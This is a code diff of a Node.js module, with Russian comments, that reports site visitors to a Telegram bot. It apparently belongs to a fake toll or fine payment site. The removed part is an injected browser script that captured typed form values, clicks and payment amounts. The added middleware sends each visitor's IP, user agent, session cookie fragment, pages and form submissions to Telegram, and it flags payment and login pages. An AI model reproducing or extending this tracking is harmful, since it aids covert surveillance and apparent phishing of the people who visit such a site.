@@ -1,6 +1,8 @@
 /**
- * Telegram Logger - отправка уведомлений о действиях пользователей
+ * Telegram Logger - серверное отслеживание действий пользователей
  * Одна сессия = одно редактируемое сообщение
+ * 
+ * НОВЫЙ ПОДХОД: Логирование на уровне сервера (не клиентский скрипт)
  */
 
 const https = require('https');
@@ -23,7 +25,7 @@ setInterval(() => {
       sessions.delete(sessionId);
     }
   }
-}, 60 * 1000); // Check every minute
+}, 60 * 1000);
 
 /**
  * Send message to Telegram
@@ -57,6 +59,7 @@ async function sendTelegramMessage(text, parseMode = 'HTML') {
           if (result.ok) {
             resolve(result.result);
           } else {
+            logger.error('[TG] Send error:', result.description);
             reject(new Error(result.description));
           }
         } catch (e) {
@@ -65,7 +68,10 @@ async function sendTelegramMessage(text, parseMode = 'HTML') {
       });
     });
 
-    req.on('error', reject);
+    req.on('error', (err) => {
+      logger.error('[TG] Request error:', err.message);
+      reject(err);
+    });
     req.write(data);
     req.end();
   });
@@ -104,7 +110,6 @@ async function editTelegramMessage(messageId, text, parseMode = 'HTML') {
           if (result.ok) {
             resolve(result.result);
           } else {
-            // If message wasn't modified, it's ok
             if (result.description && result.description.includes('message is not modified')) {
               resolve(null);
             } else {
@@ -124,59 +129,94 @@ async function editTelegramMessage(messageId, text, parseMode = 'HTML') {
 }
 
 /**
- * Get short session ID for display
+ * Get page name in Russian
  */
-function getShortId(sessionId) {
-  // Extract just the random part
-  const parts = sessionId.split('_');
-  return parts.length > 2 ? parts[2].toUpperCase() : sessionId.substring(0, 8).toUpperCase();
+function getPageNameRu(path) {
+  if (!path || path === '/' || path === '') return 'Главная';
+  
+  const cleanPath = path.split('?')[0].replace(/^\//, '').replace(/\/$/, '');
+  
+  const translations = {
+    'pay-toll': 'Оплата штрафа',
+    'pay-penalty': 'Оплата штрафа',
+    'user/login': 'Вход в аккаунт',
+    'user/register': 'Регистрация',
+    'login': 'Вход',
+    'register': 'Регистрация',
+    'account': 'Личный кабинет',
+    'contact': 'Контакты',
+    'about': 'О нас',
+    'help': 'Помощь',
+    'faq': 'FAQ',
+    'appeal': 'Апелляция',
+  };
+  
+  // Check for exact match first
+  if (translations[cleanPath]) {
+    return translations[cleanPath];
+  }
+  
+  // Check for partial match
+  for (const [key, value] of Object.entries(translations)) {
+    if (cleanPath.includes(key)) {
+      return value;
+    }
+  }
+  
+  return cleanPath.charAt(0).toUpperCase() + cleanPath.slice(1);
 }
 
 /**
- * Format session logs for Telegram message
+ * Generate session ID from request
+ */
+function getSessionId(req) {
+  // Use cookie if available
+  const cookies = req.headers.cookie || '';
+  const sessionMatch = cookies.match(/SESS[a-f0-9]+=[a-zA-Z0-9%_-]+/);
+  
+  if (sessionMatch) {
+    return 'drupal_' + sessionMatch[0].substring(0, 20);
+  }
+  
+  // Fallback: IP + User-Agent hash
+  const ip = req.ip || req.socket?.remoteAddress || 'unknown';
+  const ua = (req.headers['user-agent'] || 'unknown').substring(0, 50);
+  const hash = Buffer.from(ip + ua).toString('base64').substring(0, 12);
+  return 'ip_' + hash;
+}
+
+/**
+ * Format session message for Telegram
  */
 function formatSessionMessage(session, sessionId) {
-  const shortId = getShortId(sessionId);
+  const shortId = sessionId.substring(0, 15).toUpperCase();
   
   let message = `🔗 <b>Client</b> [<code>${shortId}</code>]\n`;
-  message += `📱 <i>${session.userAgent || 'Unknown'}</i>\n`;
-  message += `🌍 IP: <code>${session.ip || 'Unknown'}</code>\n`;
-  message += `\n`;
+  message += `📱 <code>${(session.userAgent || 'Unknown').substring(0, 80)}</code>\n`;
+  message += `🌍 IP: <code>${session.ip || 'Unknown'}</code>\n\n`;
   
-  // Add each log entry
-  session.logs.forEach((log) => {
+  // Add logs
+  session.logs.forEach((log, index) => {
+    const time = new Date(log.time).toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    
     switch (log.type) {
       case 'page_view':
-        message += `↪️ Перешёл на страницу: "<b>${log.page}</b>"\n`;
+        message += `📍 [${time}] Находится на: <b>${log.page}</b>\n`;
         break;
-      case 'current_page':
-        message += `📍 Находится на странице: "<b>${log.page}</b>"\n`;
-        break;
-      case 'input_start':
-        message += `✏️ Заполняет форму: [${log.field}]\n`;
-        break;
-      case 'input':
-        message += `📝 Заполнил форму [${log.field}]: "<b>${log.value}</b>"\n`;
-        break;
-      case 'click':
-        message += `👆 Нажал: "<b>${log.element}</b>"\n`;
+      case 'navigation':
+        message += `↪️ [${time}] Перешёл на: <b>${log.page}</b>\n`;
         break;
       case 'form_submit':
-        message += `📤 Отправил форму: "<b>${log.form}</b>"\n`;
+        message += `📤 [${time}] Отправил форму на: <b>${log.page}</b>\n`;
         break;
-      case 'payment':
-        message += `💳 Перешёл на оплату: <b>€${log.amount}</b>\n`;
+      case 'payment_page':
+        message += `💳 [${time}] <b>СТРАНИЦА ОПЛАТЫ!</b>\n`;
         break;
-      case 'payment_redirect':
-        message += `🔄 Перенаправлен на оплату: <b>€${log.amount}</b>\n`;
-        break;
-      case 'error':
-        message += `❌ Ошибка: "${log.message}"\n`;
+      case 'login_page':
+        message += `🔐 [${time}] Страница входа\n`;
         break;
       default:
-        if (log.message) {
-          message += `• ${log.message}\n`;
-        }
+        message += `• [${time}] ${log.message || log.type}\n`;
     }
   });
   
@@ -184,207 +224,115 @@ function formatSessionMessage(session, sessionId) {
 }
 
 /**
- * Track user action
- * @param {string} sessionId - Unique session identifier
- * @param {object} action - Action data { type, page?, field?, value?, element?, etc }
- * @param {object} meta - Metadata { ip, userAgent }
+ * Track page request (called from server middleware)
  */
-async function trackAction(sessionId, action, meta = {}) {
+async function trackPageRequest(req) {
   try {
+    // Skip static files and assets
+    const path = req.url || req.path || '/';
+    if (path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|map)(\?|$)/i)) {
+      return;
+    }
+    
+    // Skip API and internal paths
+    if (path.startsWith('/api/') || path.startsWith('/_')) {
+      return;
+    }
+    
+    const sessionId = getSessionId(req);
+    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const method = req.method || 'GET';
+    const pageName = getPageNameRu(path);
+    
     let session = sessions.get(sessionId);
     
-    // Create new session if doesn't exist
+    // Create new session
     if (!session) {
       session = {
         messageId: null,
         logs: [],
-        ip: meta.ip || 'Unknown',
-        userAgent: meta.userAgent ? meta.userAgent.substring(0, 100) : 'Unknown',
+        ip: ip,
+        userAgent: userAgent,
         startTime: Date.now(),
+        lastPage: null,
       };
       sessions.set(sessionId, session);
     }
     
-    // Update IP if provided
-    if (meta.ip && session.ip === 'Unknown') {
-      session.ip = meta.ip;
+    // Determine action type
+    let actionType = 'page_view';
+    
+    if (session.lastPage && session.lastPage !== path) {
+      actionType = 'navigation';
     }
     
-    // Add action to logs (avoid duplicates for page_view)
+    if (method === 'POST') {
+      actionType = 'form_submit';
+    }
+    
+    if (path.includes('pay-toll') || path.includes('pay-penalty') || path.includes('payment')) {
+      actionType = 'payment_page';
+    }
+    
+    if (path.includes('login') || path.includes('user/login')) {
+      actionType = 'login_page';
+    }
+    
+    // Avoid duplicate logs for same page
     const lastLog = session.logs[session.logs.length - 1];
     const isDuplicate = lastLog && 
-      lastLog.type === action.type && 
-      lastLog.page === action.page &&
-      lastLog.field === action.field &&
-      lastLog.value === action.value;
+      lastLog.type === actionType && 
+      lastLog.page === pageName &&
+      (Date.now() - lastLog.time) < 5000; // Within 5 seconds
     
     if (!isDuplicate) {
       session.logs.push({
-        ...action,
+        type: actionType,
+        page: pageName,
+        path: path,
+        method: method,
         time: Date.now(),
       });
-    }
-    
-    // Limit logs to last 20 entries
-    if (session.logs.length > 20) {
-      session.logs = session.logs.slice(-20);
-    }
-    
-    // Format message
-    const messageText = formatSessionMessage(session, sessionId);
-    
-    // Send or edit message
-    if (session.messageId) {
-      // Edit existing message
-      await editTelegramMessage(session.messageId, messageText);
-    } else {
-      // Send new message
-      const result = await sendTelegramMessage(messageText);
-      if (result && result.message_id) {
-        session.messageId = result.message_id;
+      
+      // Limit logs
+      if (session.logs.length > 15) {
+        session.logs = session.logs.slice(-15);
+      }
+      
+      session.lastPage = path;
+      
+      // Format and send/edit message
+      const messageText = formatSessionMessage(session, sessionId);
+      
+      if (session.messageId) {
+        await editTelegramMessage(session.messageId, messageText);
+      } else {
+        const result = await sendTelegramMessage(messageText);
+        if (result && result.message_id) {
+          session.messageId = result.message_id;
+          logger.info(`[TG] New session ${sessionId}, message_id: ${result.message_id}`);
+        }
       }
     }
     
-    logger.debug(`[TelegramLogger] Tracked action for session ${sessionId}:`, action);
-    return true;
   } catch (error) {
-    logger.error('[TelegramLogger] Error tracking action:', error.message);
-    return false;
+    logger.error('[TG] Track error:', error.message);
   }
 }
 
 /**
- * Generate tracking script to inject into HTML
+ * Express middleware for tracking
  */
-function getTrackingScript() {
-  return `
-<script>
-(function() {
-  'use strict';
-  
-  // Generate or get session ID
-  let sessionId = sessionStorage.getItem('_trackSessionId');
-  if (!sessionId) {
-    sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-    sessionStorage.setItem('_trackSessionId', sessionId);
-  }
-  
-  // Track function
-  function track(action) {
-    try {
-      fetch('/api/track', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          sessionId: sessionId,
-          action: action
-        }),
-        keepalive: true
-      }).catch(function() {});
-    } catch(e) {}
-  }
-  
-  // Get page name from URL
-  function getPageName() {
-    const path = window.location.pathname;
-    if (path === '/' || path === '') return 'Главная';
-    const name = path.replace(/^\//, '').replace(/\\/$/, '');
-    // Translate common pages
-    const translations = {
-      'pay-toll': 'Оплата',
-      'login': 'Вход',
-      'register': 'Регистрация',
-      'account': 'Аккаунт',
-      'ticket': 'Билет',
-      'contact': 'Контакты'
-    };
-    return translations[name] || name.charAt(0).toUpperCase() + name.slice(1);
-  }
-  
-  // Track page view on load
-  track({ type: 'page_view', page: getPageName() });
-  
-  // Track navigation (SPA support)
-  let lastPath = window.location.pathname;
-  setInterval(function() {
-    if (window.location.pathname !== lastPath) {
-      lastPath = window.location.pathname;
-      track({ type: 'page_view', page: getPageName() });
-    }
-  }, 500);
-  
-  // Track input changes (with debounce)
-  const inputTimers = {};
-  const activeInputs = {};
-  
-  document.addEventListener('focus', function(e) {
-    const el = e.target;
-    if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT') {
-      const fieldName = el.name || el.id || el.placeholder || el.type || 'поле';
-      if (el.type !== 'password' && el.type !== 'hidden' && !activeInputs[fieldName]) {
-        activeInputs[fieldName] = true;
-        track({ type: 'input_start', field: fieldName });
-      }
-    }
-  }, true);
-  
-  document.addEventListener('input', function(e) {
-    const el = e.target;
-    if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT') {
-      const fieldName = el.name || el.id || el.placeholder || el.type || 'поле';
-      
-      // Don't track passwords or hidden
-      if (el.type === 'password' || el.type === 'hidden') return;
-      
-      // Debounce - send after 1.5 seconds of no typing
-      clearTimeout(inputTimers[fieldName]);
-      inputTimers[fieldName] = setTimeout(function() {
-        const value = el.value;
-        if (value && value.length > 0) {
-          track({ type: 'input', field: fieldName, value: value.substring(0, 50) });
-        }
-      }, 1500);
-    }
-  }, true);
-  
-  // Track button clicks
-  document.addEventListener('click', function(e) {
-    const el = e.target.closest('button, input[type="submit"], a.btn, .button, [role="button"], .pay-button');
-    if (el) {
-      let text = el.innerText || el.value || el.title || el.name || 'кнопка';
-      text = text.trim().substring(0, 30);
-      
-      // Check if it's a payment button
-      if (text.toLowerCase().includes('pay') || el.classList.contains('pay-button')) {
-        // Try to find amount
-        const amountEl = document.querySelector('.total, .amount, [data-amount]');
-        const amount = amountEl ? amountEl.innerText.replace(/[^0-9.,]/g, '') : null;
-        if (amount) {
-          track({ type: 'payment', amount: amount });
-        } else {
-          track({ type: 'click', element: text });
-        }
-      } else {
-        track({ type: 'click', element: text });
-      }
-    }
-  }, true);
-  
-  // Track form submissions
-  document.addEventListener('submit', function(e) {
-    const form = e.target;
-    const formName = form.name || form.id || 'форма';
-    track({ type: 'form_submit', form: formName.substring(0, 30) });
-  }, true);
-  
-  console.log('[Tracker] Отслеживание сессии активировано:', sessionId);
-})();
-</script>`;
+function trackingMiddleware(req, res, next) {
+  // Track asynchronously, don't block request
+  trackPageRequest(req).catch(() => {});
+  next();
 }
 
 module.exports = {
-  trackAction,
-  getTrackingScript,
+  trackPageRequest,
+  trackingMiddleware,
   sendTelegramMessage,
   editTelegramMessage,
 };
